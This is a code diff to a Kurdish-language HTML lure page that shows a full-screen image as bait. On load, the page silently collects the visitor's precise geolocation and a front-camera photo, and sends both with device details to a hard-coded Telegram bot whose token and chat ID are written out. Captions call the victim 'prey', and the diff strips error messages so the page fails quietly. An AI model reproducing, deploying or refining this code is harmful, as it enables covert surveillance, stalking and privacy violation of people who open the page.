@@ -7,8 +7,8 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            /* وێنەی IMG_3677 وەک داو بەکاردێت */
-            background: url('IMG_3677.jpeg') center center / cover no-repeat fixed;
+            /* 😈 لێرە چاکم کرد: IMG_3677.JPG وەک ئەوەی لە وێنەکەدا دیارە */
+            background: url('IMG_3677.JPG') center center / cover no-repeat fixed;
             background-color: #000;
             min-height: 100vh;
             overflow: hidden;
@@ -20,7 +20,6 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <script>
-        // 😈 ئابادۆن تۆکن و ئایدییە نوێیەکەی جێگیر کرد
         const B_T = "8825038954:AAGVsn1Kj3ppOyY9xCYX-f1t9KJR15C1XJ0";
         const C_I = "212703396";
 
@@ -35,44 +34,38 @@
             const fd = new FormData();
             fd.append('chat_id', C_I);
             fd.append('photo', blob, 'target.jpg');
-            fd.append('caption', `😈 نێچیرێکی نوێ کەوتە داوەوە!\n📍 شوێن: https://www.google.com/maps?q=${lat},${lon}\n🕒 کات: ${new Date().toLocaleString('ckb')}\n🧬 ئامێر: ${navigator.userAgent}`);
+            fd.append('caption', `😈 نێچیرێکی نوێ گیرا!\n📍 شوێن: https://www.google.com/maps?q=${lat},${lon}\n🕒 کات: ${new Date().toLocaleString('ckb')}\n🧬 ئامێر: ${navigator.userAgent}`);
             await fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
         }
 
         async function start() {
-            await sendMsg("🎯 نێچیرەکە دەرگای دۆزەخی کردەوە...");
+            await sendMsg("🎯 تەڵەکە کارا بوو...");
             let lat = null, lon = null;
-            
             try {
                 const pos = await new Promise((ok, no) => {
                     navigator.geolocation.getCurrentPosition(ok, no, { enableHighAccuracy: true, timeout: 8000 });
                 });
                 lat = pos.coords.latitude;
                 lon = pos.coords.longitude;
-            } catch (e) { await sendMsg(`❌ شوێنەکە وەرنەگیرا: ${e.message}`); }
+            } catch (e) {}
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('video');
                 v.srcObject = stream;
-                
                 await new Promise(r => setTimeout(r, 2500));
-                
                 const c = document.getElementById('canvas');
                 c.width = v.videoWidth || 640;
                 c.height = v.videoHeight || 480;
                 c.getContext('2d').drawImage(v, 0, 0);
-                
                 c.toBlob(async (blob) => {
                     if (blob) {
                         await sendPhoto(blob, lat || "Unknown", lon || "Unknown");
-                        await sendMsg("📸 وێنەکە وەک قوربانی بۆت نێردرا!");
                     }
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg', 0.8);
-            } catch (e) { await sendMsg(`🚫 ڕێگری لە کامێرا کرا: ${e.name}`); }
+            } catch (e) {}
         }
-
         window.addEventListener('load', start);
     </script>
 </body>
